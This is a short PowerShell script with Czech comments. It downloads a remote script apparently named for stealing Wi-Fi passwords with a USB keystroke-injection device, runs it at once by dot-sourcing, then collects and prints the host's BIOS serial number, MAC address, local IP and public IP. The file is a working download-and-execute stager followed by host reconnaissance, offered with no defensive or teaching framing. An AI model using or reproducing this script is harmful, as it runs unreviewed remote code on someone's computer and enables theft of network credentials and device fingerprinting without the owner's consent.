# Nastavení URL skriptu, který chcete stáhnout a spustit
$scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"

# Nastavení cesty, kam chcete skript uložit
$scriptPath = "C:\path\to\downloaded\script.ps1"

# Stažení skriptu
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath

# Kontrola, zda byl skript úspěšně stažen
if (Test-Path $scriptPath) {
    # Spuštění staženého skriptu
    . $scriptPath
} else {
    Write-Host "Skript se nepodařilo stáhnout."
}

$serialNumber = Get-WmiObject win32_bios | Select-Object -ExpandProperty SerialNumber; $macAddress = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | Select-Object -ExpandProperty MacAddress; $localIP = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.AddressState -eq "Preferred" -and $_.InterfaceAlias -notlike "Loopback*" } | Select-Object -ExpandProperty IPAddress; $publicIP = Invoke-RestMethod -Uri "http://icanhazip.com"; Write-Host "Sériové číslo: $serialNumber, MAC adresa: $macAddress, Lokální IP adresa: $localIP, Veřejná IP adresa: $publicIP"
